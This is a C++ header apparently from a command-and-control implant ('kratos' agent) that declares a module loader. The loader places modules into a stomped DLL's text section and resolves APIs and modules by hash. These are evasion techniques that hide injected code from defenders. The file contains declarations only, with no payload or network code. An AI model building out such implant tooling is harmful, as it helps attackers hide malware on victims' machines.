#pragma once
#include <windows.h>
#include "agent/core.h"

#define DOS_HEADER(base) ((PIMAGE_DOS_HEADER)(base))
#define NT_HEADERS(base) ((PIMAGE_NT_HEADERS)((PBYTE)(base) + DOS_HEADER(base)->e_lfanew))
#define OPT_HEADER(base) (&NT_HEADERS(base)->OptionalHeader)
#define FILE_HEADER(base) (&NT_HEADERS(base)->FileHeader)
#define SECTION_HEADER(base) ((PIMAGE_SECTION_HEADER)((PBYTE)&NT_HEADERS(base)->OptionalHeader + FILE_HEADER(base)->SizeOfOptionalHeader))
#define RVA2VA(type, base, rva) ((type)((PBYTE)(base) + (rva)))

#define PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF)

#define MAX_MODULES 64
#define MODULE_SLOT_SIZE ( ( SIZE_T ) 8 * 1024 )




// struct passed to modules
typedef struct {
	INT32( WINAPI* ModuleUnpack4 )( );
	PBYTE( WINAPI* ModuleUnpackBytes )( INT32 Length );

	void ( WINAPI* ModulePack4 )( INT32 Value );
	void ( WINAPI* ModulePack8 )( INT64 Value );
	void ( WINAPI* ModulePackBytes )( PBYTE Data, INT32 length );

	FARPROC ( WINAPI* ModuleGetProcAddress )( HMODULE dll, DWORD Hash );
	HMODULE ( WINAPI* ModuleGetModule )( DWORD Hash );

	HLOCAL ( WINAPI* ModuleAllocate )( SIZE_T size );
	HLOCAL ( WINAPI* ModuleFreeMem ) ( HLOCAL buf  );
}Module, *PModule;

typedef void (WINAPI *ModuleEntry)(PModule, INT32);

typedef struct {
	INT32 id;
	PVOID EntryPoint;
	SIZE_T ModuleSize;
	SIZE_T ModuleSizeInMemory;
} ModuleInformation;


class Modules {
private:
	INT64 LoadModulesBitMap;
	BOOL IsStompedDllLoaded;
	ModuleInformation ModuleInfos[ MAX_MODULES ]{};

	PModule ModuleStruct;

	PVOID StompedDllText;
	SIZE_T StompedDllTextSize;
	PVOID TextSectionIndex;
	PVOID MappedOleBaseAddress;

	PVOID ReserveArena( SIZE_T size );
	void UpdateBitField( INT32 Bit );
	void ClearBitField( INT32 Bit );
	ModuleInformation* FindFreeModInfo( );
	ModuleInformation* FindModInfoEntry( INT32 needed );
	BOOL CraftModuleStruct( );

	
	

public:
	static void* operator new( SIZE_T size ) {
		void* ptr = kratos->apis.LocalAlloc( ALLOC_ARGS, size );
		if ( ! ptr ) { return NULL; }
		return ptr;
	}
	

	BOOL IsModuleLoaded( INT32 bit );
	BOOL LoadModule( PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit );
	BOOL UnLoadModule( INT32 ModuleBit );
	BOOL LoadStompedDll( );
	BOOL GetStompedDllText( PVOID DllBase );
	BOOL RunModuleCommand( INT32 ModuleBit );

	INT64 GetLoadedModulesBitMap();

	void Cleanup();

};


extern Modules* modules;